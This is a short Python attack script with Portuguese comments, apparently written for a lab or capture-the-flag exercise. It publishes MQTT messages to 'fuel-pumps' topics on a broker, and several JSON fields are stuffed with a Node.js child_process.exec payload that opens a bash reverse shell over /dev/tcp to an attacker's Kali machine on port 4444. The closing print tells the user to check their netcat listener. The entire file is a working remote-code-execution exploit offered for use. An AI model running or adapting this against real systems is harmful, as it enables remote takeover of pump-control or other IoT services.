import json
import paho.mqtt.client as mqtt

BROKER = "10.10.100.100"
KALI_IP = "10.10.100.8"
KALI_PORT = 4444

# Payload em Node.js para criar uma conexão reversa de terminal para o seu Kali
payload_rce = f"require('child_process').exec('bash -c \"bash -i >& /dev/tcp/{KALI_IP}/{KALI_PORT} 0>&1\"')"

client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
client.connect(BROKER, 1883, 60)

# Vamos enviar o exploit para todos os pontos possíveis de uma vez só para economizar tempo
payload_data = {
    "pumpId": "PUMP001",
    "location": payload_rce,
    "fuelType": "Diesel S-10",
    "capacityCurrent": 100,
    "status": payload_rce
}

payload_refill = {
    "pumpId": payload_rce,
    "currentLevel": 5
}

print("[*] Disparando payloads automáticos de RCE...")
client.publish("fuel-pumps/data", json.dumps(payload_data))
client.publish("fuel-pumps/refill-request", json.dumps(payload_refill))

client.disconnect()
print("[*] Enviado! Verifique imediatamente o terminal onde você rodou o nc -lvnp 4444")
